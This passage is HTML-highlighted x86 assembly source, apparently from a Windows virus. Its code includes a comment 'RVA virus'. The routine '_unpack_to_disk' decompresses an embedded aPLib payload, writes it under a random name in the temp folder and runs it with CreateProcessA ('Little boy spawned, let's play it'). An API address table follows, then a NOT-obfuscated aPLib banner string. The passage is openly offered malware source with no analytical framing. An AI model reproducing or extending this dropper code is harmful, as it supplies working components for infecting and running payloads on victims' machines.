   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc2">.34</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">

   </span><span class="sc1">;  RVA virus</span><span class="sc0">

   </span><span class="sc5">_loader_memory_protect?_dif</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc1">;  IMAGEBASE in ECX</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_unpack_to_disk</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  alloc memory</span><span class="sc0">
   </span><span class="sc1">;  depack file in it</span><span class="sc0">
   </span><span class="sc1">;  choose random name</span><span class="sc0">
   </span><span class="sc1">;  create file in %temp%</span><span class="sc0">
   </span><span class="sc1">;  play it</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_unpack_to_disk_error</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">l_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">_compressed_code_place</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_aP_depack_asm</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;  unpacked code lenght</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetTempPathA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_unpack_to_disk_error_1</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
   </span><span class="sc5">_loader_fixed_random_value</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0fh</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NIW'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetTempFileNameA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_unpack_to_disk_error_1</span><span class="sc0">

   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">   </span><span class="sc1">;   CREATE_ALWAYS</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc1">;  Getting some basic info.</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GetStartupInfoA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc1">;  Little boy spawned, let's play it</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">   </span><span class="sc1">;   NORMAL_PRIORITY_CLASS</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_CreateProcessA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">80</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc5">_unpack_to_disk_error_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">

   </span><span class="sc5">_unpack_to_disk_error</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">_api_addr_ini</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc5">_CreateFileA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_VirtualProtect</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_OpenMutexA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_GetTempPathA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_GetTempFileNameA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_CreateProcessA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_GetStartupInfoA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_GlobalAlloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">_GlobalFree</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">_api_addr_end</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc5">l_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;  loader size</span><span class="sc0">

   </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">l_end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc5">MessageBoxA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0BFF5412Eh</span><span class="sc0">
   </span><span class="sc5">MessageBox</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0BFF5412Eh</span><span class="sc0">

   </span><span class="sc5">aplib@006</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">00ah</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">04ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">04ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">07ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">02ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc0">
